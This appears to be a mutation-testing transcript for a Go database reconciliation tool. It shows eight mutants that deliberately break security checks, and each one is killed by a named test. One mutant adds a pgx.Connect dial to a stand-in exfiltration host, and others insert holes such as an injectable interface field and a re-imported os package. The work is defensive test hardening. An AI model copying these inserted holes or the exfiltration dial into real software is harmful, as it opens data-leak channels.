# mutation transcript

- spec: `mutations.json`
- repo: `C:\Users\kasel\source\repos\etherfi\Solvent`
- **tested SHA: `8454ee7516199ae14a5e0e19c249dc358c711d9b`**  (test(sdd): task-9 wave-16 mutation spec (8 mutants) committed BEFORE the loop)
- started (UTC): 2026-07-27T03:48:25+00:00
- applier: `mutate.py`, exactly-one-occurrence assertion in `apply_edit`

## W16M1 — the pgx PG* presence taint never fires (the closed table still classifies them; nothing taints)

**Property under attack:** F1: every PG* variable pgx reads at connect time must presence-taint acceptance - an ambient PGHOST/PGDATABASE can point the connection at a different server while the receipt claims otherwise, and reconcile cannot prove from inside the run that it did not.

```diff
--- cmd/reconcile/env.go:248
-	return func(v string) string {
+	return func(v string) string {
+		if true {
+			return "" // W16M1: PG* presence taint removed
+		}
```
APPLIED at cmd/reconcile/env.go:248 (1 occurrence, asserted)

`go test ./cmd/reconcile -run TestEnvSurfaceClosed|TestAmbientPGHostTaintsAcceptance -count=1`

Killed by:
  - `TestAmbientPGHostTaintsAcceptance`
  - `TestEnvSurfaceClosed`

**Result: KILLED**

## W16M2 — the gate exits FIRST (the pre-wave LIFO behaviour), before rollback and close

**Property under attack:** F2: the gate must exit LAST - strictly after rollback and connection close. LIFO defers reopened the RPC surface while the transaction still held xmin; the ordering must be observable DURING the cleanup, not reconstructed from post-return state.

```diff
--- cmd/reconcile/snapshotdb/snapshotdb.go:504
-		gate.checkpoint(StageBeforeRollback)
+		gate.Exit() // W16M2: gate-first, the LIFO order round 14 found
+		gate.checkpoint(StageBeforeRollback)
```
APPLIED at cmd/reconcile/snapshotdb/snapshotdb.go:504 (1 occurrence, asserted)

`go test ./cmd/reconcile -run TestProductionGateActiveThroughSnapshotLifecycle -count=1`

Killed by:
  - `TestProductionGateActiveThroughSnapshotLifecycle`

**Result: KILLED**

## W16M3 — `os` re-imported into snapshotdb and used (compiles: the read is real)

**Property under attack:** F3 evasion shape 'os reintroduced': the import allowlist must state the TRUE capability set - `os` grants StartProcess (a network client one exec away), not just the one ReadFile the package wanted, so it may not come back for convenience.

```diff
--- cmd/reconcile/snapshotdb/snapshotdb.go:68
-	"math/big"
+	"math/big"
+	"os"
```
APPLIED at cmd/reconcile/snapshotdb/snapshotdb.go:68 (1 occurrence, asserted)

```diff
--- cmd/reconcile/snapshotdb/snapshotdb.go:466
-	p.ConfigSHA = prm.ConfigSHA
+	p.ConfigSHA = prm.ConfigSHA
+	if raw, rerr := os.ReadFile("config/contracts.json"); rerr == nil {
+		_ = raw // W16M3: os is back - and StartProcess came with it
+	}
```
APPLIED at cmd/reconcile/snapshotdb/snapshotdb.go:466 (1 occurrence, asserted)

`go test ./cmd/reconcile/snapshotdb -run TestSnapshotDBImportsAreDBOnly|TestSnapshotDBAPISurfaceRejectsInjection|TestSnapshotDBCapabilityBoundary -count=1`

Killed by:
  - `TestSnapshotDBImportsAreDBOnly`

**Result: KILLED**

## W16M4 — a second pgx.Connect to an attacker-chosen host, opened under the closed gate (zero new imports, compiles)

**Property under attack:** F3 evasion shape 'capability through a STILL-ALLOWED package': pgx is legitimately imported (the DB is the point of Stage A) and pgx.Connect dials whatever DSN it is handed - so the boundary must pin the CALL SITE: exactly one dial, on the caller's audited roDSN. This is the sharpest shape the remaining allowlist permits and it needs no new import at all.

```diff
--- cmd/reconcile/snapshotdb/snapshotdb.go:494
-	gate.Enter()
+	gate.Enter()
+	if side, serr := pgx.Connect(ctx, "postgres://exfil.example.internal:5432/x"); serr == nil {
+		side.Close(ctx) // W16M4: a network dial through the ALLOWED driver, under the open snapshot
+	}
```
APPLIED at cmd/reconcile/snapshotdb/snapshotdb.go:494 (1 occurrence, asserted)

`go test ./cmd/reconcile/snapshotdb -run TestSnapshotDBImportsAreDBOnly|TestSnapshotDBAPISurfaceRejectsInjection|TestSnapshotDBCapabilityBoundary -count=1`

Killed by:
  - `TestSnapshotDBCapabilityBoundary`

**Result: KILLED**

## W16M5 — exported store.Querier field on Params, dispatched inside the open transaction (no interface literal anywhere; compiles)

**Property under attack:** F3 evasion shape 'named-interface indirection': the AST test matches interface SPELLINGS, so a named interface in an EXPORTED field (store.Querier - a real, imported, allowlisted-package interface) parses as a SelectorExpr and slips through. Only semantic resolution of the UNDERLYING type refuses it, and an exported interface field is exactly the injection channel: cmd/reconcile CAN import chain and can implement it with a dialer.

```diff
--- cmd/reconcile/snapshotdb/snapshotdb.go:213
-	CollateralReplay int
+	CollateralReplay int
+	// W16M5: a NAMED interface - the AST sees a SelectorExpr, never an
+	// InterfaceType node.
+	Q store.Querier
```
APPLIED at cmd/reconcile/snapshotdb/snapshotdb.go:213 (1 occurrence, asserted)

```diff
--- cmd/reconcile/snapshotdb/snapshotdb.go:524
-	// --- pins (§3.1): P = derive cursor read INSIDE the snapshot ----------
+	if prm.Q != nil {
+		_, _ = store.DeriveCursorStates(ctx, prm.Q) // W16M5: dispatches whatever the caller loaded in
+	}
+	// --- pins (§3.1): P = derive cursor read INSIDE the snapshot ----------
```
APPLIED at cmd/reconcile/snapshotdb/snapshotdb.go:524 (1 occurrence, asserted)

`go test ./cmd/reconcile/snapshotdb -run TestSnapshotDBImportsAreDBOnly|TestSnapshotDBAPISurfaceRejectsInjection|TestSnapshotDBCapabilityBoundary -count=1`

Killed by:
  - `TestSnapshotDBCapabilityBoundary`

**Result: KILLED**

## W16M6 — the persisted-interval read replaced by the env read (the wave-15 channel, reinstated as a bound input)

**Property under attack:** F4: the freshness bound must be evaluated from the DAEMON-PERSISTED cadence (sweep_generations.configured_interval_seconds), never from the environment's copy of it - the env value is an unverifiable operator assertion, demoted to a cross-check that can only taint.

```diff
--- cmd/reconcile/env.go:311
-		interval := time.Duration(*persisted) * time.Second
+		interval, _ := resolveSnapshotInterval() // W16M6: env-read replaces the persisted read
```
APPLIED at cmd/reconcile/env.go:311 (1 occurrence, asserted)

`go test ./cmd/reconcile -run TestPersistedDaemonCadenceGovernsFreshnessBound|TestEnvVsPersistedMismatchTaintsAndNeverWidens|TestExtremeSnapshotIntervalEnvIsNonPass -count=1`

Killed by:
  - `TestEnvVsPersistedMismatchTaintsAndNeverWidens`
  - `TestExtremeSnapshotIntervalEnvIsNonPass`
  - `TestPersistedDaemonCadenceGovernsFreshnessBound`

**Result: KILLED**

## W16M7 — the partial-DSN rejection never fires

**Property under attack:** F1: a partial DSN (no explicit host and/or database) must be REFUSED - pgx merges ambient PG* settings underneath it, so the claim's subject would be chosen by the environment rather than by the receipt.

```diff
--- cmd/reconcile/main.go:286
-	if u.Hostname() == "" || strings.TrimPrefix(u.Path, "/") == "" {
+	if false { // W16M7: partial-DSN rejection removed
```
APPLIED at cmd/reconcile/main.go:286 (1 occurrence, asserted)

`go test ./cmd/reconcile -run TestPartialDSNIsRejected|TestReadOnlyDSNInjectsSessionOption -count=1`

Killed by:
  - `TestPartialDSNIsRejected`

**Result: KILLED**

## W16M8 — the connected-identity read is dropped (the artifact would carry the DSN's parsed claim alone)

**Property under attack:** F1: the artifact's database identity must be the CONNECTED identity the server reported over the snapshot's own connection - what the server says it is, never what the URL claimed.

```diff
--- cmd/reconcile/snapshotdb/snapshotdb.go:516
-	p.Identity, err = readConnectedIdentity(ctx, tx)
+	_ = readConnectedIdentity // W16M8: connected-identity recording removed
```
APPLIED at cmd/reconcile/snapshotdb/snapshotdb.go:516 (1 occurrence, asserted)

`go test ./cmd/reconcile -run TestConnectedIdentityRecordsServerTruth -count=1`

Killed by:
  - `TestConnectedIdentityRecordsServerTruth`

**Result: KILLED**

## restore verification

`git status --porcelain` over the 3 mutated file(s) is EMPTY: every file is byte-identical to `8454ee7`. Restores came from in-memory copies taken before each edit; `git checkout` is never used.

## summary

| # | result | property | killed by |
|---|---|---|---|
| W16M1 | **KILLED** | F1: every PG* variable pgx reads at connect time must presence-taint acceptance - an ambient PGHOST/PGDATABASE can point the connection at a different server while the receipt claims otherwise, and reconcile cannot prove from inside the run that it did not. | `TestAmbientPGHostTaintsAcceptance`<br>`TestEnvSurfaceClosed` |
| W16M2 | **KILLED** | F2: the gate must exit LAST - strictly after rollback and connection close. LIFO defers reopened the RPC surface while the transaction still held xmin; the ordering must be observable DURING the cleanup, not reconstructed from post-return state. | `TestProductionGateActiveThroughSnapshotLifecycle` |
| W16M3 | **KILLED** | F3 evasion shape 'os reintroduced': the import allowlist must state the TRUE capability set - `os` grants StartProcess (a network client one exec away), not just the one ReadFile the package wanted, so it may not come back for convenience. | `TestSnapshotDBImportsAreDBOnly` |
| W16M4 | **KILLED** | F3 evasion shape 'capability through a STILL-ALLOWED package': pgx is legitimately imported (the DB is the point of Stage A) and pgx.Connect dials whatever DSN it is handed - so the boundary must pin the CALL SITE: exactly one dial, on the caller's audited roDSN. This is the sharpest shape the remaining allowlist permits and it needs no new import at all. | `TestSnapshotDBCapabilityBoundary` |
| W16M5 | **KILLED** | F3 evasion shape 'named-interface indirection': the AST test matches interface SPELLINGS, so a named interface in an EXPORTED field (store.Querier - a real, imported, allowlisted-package interface) parses as a SelectorExpr and slips through. Only semantic resolution of the UNDERLYING type refuses it, and an exported interface field is exactly the injection channel: cmd/reconcile CAN import chain and can implement it with a dialer. | `TestSnapshotDBCapabilityBoundary` |
| W16M6 | **KILLED** | F4: the freshness bound must be evaluated from the DAEMON-PERSISTED cadence (sweep_generations.configured_interval_seconds), never from the environment's copy of it - the env value is an unverifiable operator assertion, demoted to a cross-check that can only taint. | `TestEnvVsPersistedMismatchTaintsAndNeverWidens`<br>`TestExtremeSnapshotIntervalEnvIsNonPass`<br>`TestPersistedDaemonCadenceGovernsFreshnessBound` |
| W16M7 | **KILLED** | F1: a partial DSN (no explicit host and/or database) must be REFUSED - pgx merges ambient PG* settings underneath it, so the claim's subject would be chosen by the environment rather than by the receipt. | `TestPartialDSNIsRejected` |
| W16M8 | **KILLED** | F1: the artifact's database identity must be the CONNECTED identity the server reported over the snapshot's own connection - what the server says it is, never what the URL claimed. | `TestConnectedIdentityRecordsServerTruth` |

8 mutants, 8 killed, 0 survived.
